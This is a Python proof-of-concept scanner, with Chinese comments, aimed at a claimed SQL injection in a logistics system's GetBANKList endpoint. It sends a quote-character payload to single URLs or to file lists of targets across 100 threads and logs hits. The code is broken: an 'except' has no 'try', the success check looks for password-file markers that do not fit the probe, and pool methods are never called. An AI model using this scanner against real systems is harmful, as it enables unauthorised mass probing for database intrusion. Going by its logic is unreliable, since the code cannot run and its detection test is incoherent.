import argparse,sys,requests,json
import urllib3
import warnings
from multiprocessing.dummy import Pool

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def main():
    # sqlmap 都需要通过命令行传递参数
    # 单个url和一个文件
    # 初始化
    parse = argparse.ArgumentParser(description="东胜物流 GetBANKList SQL注入")

    # 添加命令行参数
    parse.add_argument('-u','--url',dest='url',type=str,help='please input your link')
    parse.add_argument('-f','--file',dest='file',type=str,help='please input your file')

    # 实例化
    args = parse.parse_args()

    # 对用户输入的参数做判断 输入正确 url file 输入错误弹出提示
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        # 多线程处理
        url_list = [] # 用于接收读取文件之后的url
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close
        mp.join
        
    else:
        print(f"Usage python {sys.argv[0]} -h")

def poc(target):
    link = "/MvcShipping/MsBaseInfo/GetBANKList"
    headers = {
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Accept-Encoding": "gzip",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36",
        "Content-Length": "456"
    }
    data = "strCondition=1'"
    # try:
    res1 = requests.get(url=target,headers=headers,verify=False)
    if res1.status_code == 200:
            res2 = requests.post(url=target+link,headers=headers,data=data,verify=False)
            print(res2.text[500])
            print(type(res2.text))
            if "root:" in res2.text and "daemon:" in res2.text:
                print(f"[+]该{target}存在sql注入")
                with open('result.txt','a',encoding='utf-8') as f:
                    f.write(f"[+]该{target}存在sql注入\n")
    else:
            print(f"[-]该{target}不存在sql注入")
    except:
        print(f"该{target}存在问题，请手工测试")
# 函数入口

if __name__ == "__main__":
    main()
